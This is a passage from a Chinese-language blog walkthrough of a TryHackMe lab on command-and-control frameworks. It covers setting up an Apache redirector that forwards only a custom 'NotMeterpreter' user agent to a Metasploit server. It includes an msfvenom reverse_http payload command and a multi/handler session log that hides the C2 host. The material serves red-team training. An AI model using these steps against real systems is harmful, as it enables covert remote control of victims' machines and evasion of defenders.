<p>但这如何阻止 C2 服务器被关闭呢？当然，如果有人在您的 C2 服务器上对 Cobalt Strike 进行了指纹识别，就会有人提出投诉，然后它就会被删除。这是事实，因此您应该设置防火墙以仅允许与重定向器之间的通信，以减轻任何潜在风险。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948436.png" alt="image-20240710190110523"></p>
<h3 id="重定向器如何设置">重定向器如何设置</h3>
<p>在我们深入配置重定向器之前，我们必须首先了解重定向器是如何设置的；我们将使其与我们可用的工具（Metasploit 和 Apache2）保持一致。在 Apache 中，我们将利用一个名为“mod_rewrite”的模块（或 Rewrite 模块）。该模块允许我们编写规则，根据特定的 HTTP 标头或内容将请求转发到服务器上的内部或外部主机。我们需要使用几个模块来配置我们的重定向器。必须启用以下模块：</p>
<ul>
<li>rewrite</li>
<li>proxy</li>
<li>proxy_http</li>
<li>headers</li>
</ul>
<p><em>注意：如果您使用 Attack Box，则端口 80 上已经有一个服务正在运行 - 您必须在 /etc/apache2/ports.conf 中更改 Apache 侦听的默认端口。您必须在启动 Apache 2 服务之前执行此操作，否则它将无法启动。</em></p>
<p>您可以使用以下命令安装 apache 2 并启用它：</p>
<pre><code class="hljs scss">apt install apache2

a2enmod rewrite &amp;&amp; a2enmod proxy &amp;&amp; a2enmod proxy_http &amp;&amp; a2enmod headers &amp;&amp; systemctl start apache2 &amp;&amp; systemctl status apache2</code></pre>
<p>使用 Meterpreter，我们能够配置 HTTP 请求的各个方面，例如用户代理。威胁参与者对其 C2 HTTP/HTTPS 负载中的用户代理进行轻微调整是很常见的。它存在于每个 HTTP 请求中，并且它们看起来或多或少都相同，并且安全分析师很有可能会忽略修改后的用户代理字符串。在本次演示中，我们将使用 MSFvenom 生成 Meterpreter 反向 HTTP 负载；然后我们将在 Wireshark 中检查 HTTP 请求。</p>
<h3 id="使用修改后的标头生成有效负载">使用修改后的标头生成有效负载</h3>
<pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_http LHOST=tun0 LPORT=<span class="hljs-number">80</span> HttpUserAgent=NotMeterpreter -f exe -o shell<span class="hljs-selector-class">.exe</span></code></pre>
<p>生成修改后的可执行文件并将其传输给受害者后，在主机上打开 Wireshark 并使用 <code>HTTP</code> 过滤器仅查看 HTTP 请求。开始捕获数据包后，在受害系统上执行二进制文件。您会注意到 HTTP 请求带有我们修改后的用户代理。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948437.png" alt="image-20240710190524454"></p>
<p>现在我们有了一个可以在 HTTP 请求中控制的字段，让我们创建一个 Apache2 mod_rewrite 规则来过滤用户代理“NotMeterpreter”并将其转发到我们的 Metasploit C2 服务器。</p>
<h3 id="修改-apache-配置文件">修改 Apache 配置文件</h3>
<p>这一部分听起来可能令人生畏，但实际上很简单；我们将采用默认的 Apache 配置并根据我们的优势进行修改。在基于 Debian 的系统上，默认配置可以在 <code>/etc/apache2/sites-available/000-default.conf</code> 中找到。</p>
<pre><code class="hljs scss">cat /etc/apache2/sites-available/<span class="hljs-number">000</span>-default<span class="hljs-selector-class">.conf</span> | grep -v '#'
&lt;VirtualHost *:<span class="hljs-number">80</span>&gt;

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html


        ErrorLog ${APACHE_LOG_DIR}/error<span class="hljs-selector-class">.log</span>
        CustomLog ${APACHE_LOG_DIR}/access<span class="hljs-selector-class">.log</span> combined

&lt;/VirtualHost&gt;</code></pre>
<p>现在我们已经了解了 Apache2 配置文件的结构，我们必须在配置文件中添加几行以启用重写引擎，添加重写条件，最后通过 Apache 2 代理。这听起来相当复杂，但其实很简单。</p>
<p>要启用<a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html">Rewrite Engine</a>，我们必须将 <code>RewriteEngine On</code> 添加到 VirtualHost 部分的新行中。</p>
<p>现在我们将使用针对 HTTP 用户代理的重写条件。有关 HTTP 请求目标的完整列表，请参阅 <a target="_blank" rel="noopener" href="http://Apache.org">Apache.org</a> 上的 <a target="_blank" rel="noopener" href="https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html">mod_rewrite 文档</a>。因为我们只想匹配用户代理“NotMeterpreter”，所以我们需要使用一些基本的正则表达式来捕获它；添加 ^ 表示字符串的开头，并在系列末尾添加 $，从而得到“^NotMeterpreter$”。此正则表达式将仅捕获 NotMeterpreter 用户代理。我们可以将此行 <code>RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"</code> 添加到我们的配置中（如前所述）仅允许使用 NotMeterpreter 用户代理的 HTTP 请求访问 Metasploit。</p>
<p>最后，我们必须通过 Apache2、通过我们的代理将请求转发到 Metasploit。为此，我们必须使用 Apache mod_proxy 模块的 ProxyPass 功能。为此，我们只需要指定请求将转发到的基本 URI（在我们的例子中，我们只需要“/”），以及我们要将请求转发到的目标。这会因设置而异，但此 IP 地址将是您的 C2 服务器。在实验室场景中，Metasploit 正在侦听的将是本地主机和端口。这将为我们提供一个完整的配置文件，如下所示：</p>
<pre><code class="hljs scss">&lt;VirtualHost *:<span class="hljs-number">80</span>&gt;

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	RewriteEngine On
	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
	ProxyPass "/" "http://localhost:<span class="hljs-number">8080</span>/<span class="hljs-string">"</span>
<span class="hljs-string"></span>
<span class="hljs-string">	&lt;Directory&gt;</span>
<span class="hljs-string">		AllowOverride All</span>
<span class="hljs-string">	&lt;/Directory&gt;</span>
<span class="hljs-string"></span>
<span class="hljs-string">	ErrorLog ${APACHE_LOG_DIR}/error.log</span>
<span class="hljs-string">	CustomLog ${APACHE_LOG_DIR}/access.log combined</span>
<span class="hljs-string"></span>
<span class="hljs-string">&lt;/VirtualHost&gt;</span></code></pre>
<h3 id="设置漏洞利用多重处理程序">设置漏洞利用/多重/处理程序</h3>
<p>为了正确设置 Meterpreter，我们需要进行一些修改；在我们的实验室中，我们必须将 LHOST 参数设置为我们期望从中建立连接的传入接口；这将是 127.0.0.1。在现实世界中，这将是您的重定向器将连接到的公共接口（也称为您的公共 IP 地址），并且 LPORT 将是您喜欢的任何内容。对于实验室，我们将使用 TCP/8080；这可以是您在生产中喜欢的任何内容。与往常一样，最佳实践是通过标准协议运行服务，因此 HTTP 应在端口 80 上运行，HTTPS 应在端口 443 上运行。还需要为 ReverseListenerBindAddress 和 ReverseListenerBindPort 复制这些选项。</p>
<p>接下来，我们需要设置 OverrideLHOST - 该值将是您的重定向器的 IP 地址或域名。之后，我们需要设置OverrideLPORT；这将是重定向器上运行 HTTP 或 HTTPS 的端口。最后，我们必须将 OverrideRequestHost 设置为 true。这将使 Meterpreter 响应 OverrideHost 信息，因此所有查询都会通过重定向器而不是您的 C2 服务器。现在您已经了解了必须配置的内容，让我们深入了解一下：</p>
<pre><code class="hljs scss">root<span class="hljs-keyword">@kali</span>$ msfconsole
msf6 &gt; use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http
payload =&gt; windows/meterpreter/reverse_http
msf6 exploit(multi/handler) &gt; set LHOST <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
LHOST =&gt; <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
msf6 exploit(multi/handler) &gt; set LPORT <span class="hljs-number">8080</span>
LPORT =&gt; <span class="hljs-number">8080</span>
msf6 exploit(multi/handler) &gt; set ReverseListenerBindAddress <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
ReverseListenerBindAddress =&gt; <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
msf6 exploit(multi/handler) &gt; set ReverseListenerBindPort <span class="hljs-number">8080</span>
ReverseListenerBindPort =&gt; <span class="hljs-number">8080</span>
msf6 exploit(multi/handler) &gt; set OverrideLHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">0.44</span>
OverrideLHOST =&gt; <span class="hljs-number">192.168</span>.<span class="hljs-number">0.44</span>
msf6 exploit(multi/handler) &gt; set OverrideLPORT <span class="hljs-number">80</span>
OverrideLPORT =&gt; <span class="hljs-number">80</span>
msf6 exploit(multi/handler) &gt; set HttpUserAgent NotMeterpreter
HttpUserAgent =&gt; NotMeterpreter
msf6 exploit(multi/handler) &gt; set OverrideRequestHost true
OverrideRequestHost =&gt; true
msf6 exploit(multi/handler) &gt; run
[!] You are binding to a loopback address by setting LHOST to <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>. Did you want ReverseListenerBindAddress?
[*] Started HTTP reverse handler on <span class="hljs-attribute">http</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span>
[*] <span class="hljs-attribute">http</span>://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span> handling request from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>; (UUID: zfhp2nwt) Staging x86 payload (<span class="hljs-number">176220</span> bytes) ...
<span class="hljs-selector-attr">[*]</span> Meterpreter session <span class="hljs-number">3</span> opened (<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8080</span> -&gt; <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> ) at <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">11</span> <span class="hljs-number">02</span>:<span class="hljs-number">09</span>:<span class="hljs-number">24</span> -<span class="hljs-number">0500</span></code></pre>
<p>完成所有设置后，运行 Meterpreter Reverse Shell 现在应该通过重定向器代理所有通信！为了提高认识，下图是我们实验室中重定向器的设置方式；提醒一下，在参与中，您将需要使用多个主机和 DNS 记录而不是 IP 地址。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948438.png" alt="image-20240710192302449"></p>
<pre><code class="hljs scss">msfvenom <span class="hljs-attr">--list-options</span> -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_http<span class="hljs-comment">//查看</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407101948439.png" alt="image-20240710194020885"></p>
<h1 id="0x08-总结">0x08 总结</h1>
<h2 id="recap-回顾">Recap 回顾</h2>
<p>在这个房间中，您希望学到很多有关命令和控制框架的知识，并且能够将您在这个房间中获得的知识应用于现实世界。归根结底，红队行动中的几乎每个人都使用命令和控制框架。它是每个红队成员工具包的重要组成部分，我们鼓励您出去探索本会议室中未涵盖或提及的各种 C2 框架。</p>
<h2 id="如何选择-c2-框架">如何选择 C2 框架</h2>
<p>完成这个房间后，您可能会留下一些问题，希望其中之一是“我如何知道在我的红队运营中选择什么 C2 框架”。对此没有正确或错误的答案，只有一些您应该首先回答的一般性问题：</p>
<ul>
<li>你的目标是什么？</li>
<li>你有预算吗？</li>
<li>您需要高度可定制的东西吗？</li>
<li>是否需要现成的 AV Evasion？</li>
<li>您需要有创建自己的模块/脚本的能力吗？</li>
<li>您需要内置报告吗？</li>
</ul>
<p>然后，您应该将该信息输入到 <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0">C2 矩阵电子表格</a>中，并根据上述问题缩小选择范围。如果您找到符合您标准的高级 C2 框架，强烈建议您申请评估/试用，以确定该 C2 框架是否最适合您。</p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/')">THM-C2简介</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=THM-C2简介&amp;url=http://hybcx.xyz/2024/07/10/thm-c2-jian-jie/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/09/thm-hong-dui-opsec/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-红队 OPSEC</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/10/thm-hong-dui-zhen-cha/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM-红队侦察</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div><div><a href="/2024/06/10/thm-exploiting-active-directory/" title="THM-Exploiting Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-10</div><div class="title">THM-Exploiting Active Directory</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AC%A2%E8%BF%8E%E6%9D%A5%E5%88%B0-c2-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">欢迎来到 C2 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#room-objectives-%E6%88%BF%E9%97%B4%E7%9B%AE%E6%A0%87"><span class="toc-number">1.2.</span> <span class="toc-text">Room Objectives 房间目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%BF%E9%97%B4%E5%85%88%E5%86%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">房间先决条件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-c2%E6%A1%86%E6%9E%B6"><span class="toc-number">2.</span> <span class="toc-text">0x02 C2框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFc2%E6%A1%86%E6%9E%B6"><span class="toc-number">2.1.</span> <span class="toc-text">什么是C2框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c2%E7%BB%93%E6%9E%84"><span class="toc-number">2.2.</span> <span class="toc-text">C2结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#c2-server"><span class="toc-number">2.2.1.</span> <span class="toc-text">C2 Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#agents-payloads"><span class="toc-number">2.2.2.</span> <span class="toc-text">Agents &#x2F; Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#listeners"><span class="toc-number">2.2.3.</span> <span class="toc-text">Listeners</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#beacons"><span class="toc-number">2.2.4.</span> <span class="toc-text">Beacons</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B7%E6%B7%86%E4%BB%A3%E7%90%86%E5%9B%9E%E8%B0%83"><span class="toc-number">2.3.</span> <span class="toc-text">混淆代理回调</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sleep-timers"><span class="toc-number">2.3.1.</span> <span class="toc-text">Sleep Timers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jitter"><span class="toc-number">2.3.2.</span> <span class="toc-text">Jitter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.4.</span> <span class="toc-text">Payload 类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stageless-payloads"><span class="toc-number">2.4.1.</span> <span class="toc-text">Stageless Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#staged-payloads"><span class="toc-number">2.4.2.</span> <span class="toc-text">Staged Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-formats-%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.4.3.</span> <span class="toc-text">Payload Formats 有效负载格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#modules"><span class="toc-number">2.4.4.</span> <span class="toc-text">Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post-exploitation-modules"><span class="toc-number">2.4.5.</span> <span class="toc-text">Post Exploitation Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pivoting-modules"><span class="toc-number">2.4.6.</span> <span class="toc-text">Pivoting Modules</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#facing-the-world"><span class="toc-number">2.5.</span> <span class="toc-text">Facing the world</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#domain-fronting"><span class="toc-number">2.5.1.</span> <span class="toc-text">Domain Fronting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c2-%E9%85%8D%E7%BD%AE"><span class="toc-number">2.5.2.</span> <span class="toc-text">C2 配置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%B8%B8%E8%A7%81c2%E6%A1%86%E6%9E%B6"><span class="toc-number">3.</span> <span class="toc-text">0x03 常见C2框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">3.1.</span> <span class="toc-text">常见 C2 框架</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E8%B4%B9-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">3.2.</span> <span class="toc-text">免费 C2 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#metasploit"><span class="toc-number">3.2.1.</span> <span class="toc-text">Metasploit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#armitage"><span class="toc-number">3.2.2.</span> <span class="toc-text">Armitage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-empirestarkiller"><span class="toc-number">3.2.3.</span> <span class="toc-text">Powershell Empire&#x2F;Starkiller</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#covenant"><span class="toc-number">3.2.4.</span> <span class="toc-text">Covenant</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sliver"><span class="toc-number">3.2.5.</span> <span class="toc-text">Sliver</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%98%E8%B4%B9-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">3.3.</span> <span class="toc-text">付费 C2 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#cobalt-strike"><span class="toc-number">3.3.1.</span> <span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#brute-ratel"><span class="toc-number">3.3.2.</span> <span class="toc-text">Brute Ratel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">3.4.</span> <span class="toc-text">其他 C2 框架</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E8%AE%BE%E7%BD%AE-c2-%E6%A1%86%E6%9E%B6"><span class="toc-number">4.</span> <span class="toc-text">0x04 设置 C2 框架</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE-armitage"><span class="toc-number">4.1.</span> <span class="toc-text">设置 Armitage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#teamserver"><span class="toc-number">4.2.</span> <span class="toc-text">Teamserver</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E6%88%91%E4%BB%AC%E7%9A%84%E7%8E%AF%E5%A2%83"><span class="toc-number">4.3.</span> <span class="toc-text">准备我们的环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%B9%B6%E8%BF%9E%E6%8E%A5%E5%88%B0-armitage"><span class="toc-number">4.4.</span> <span 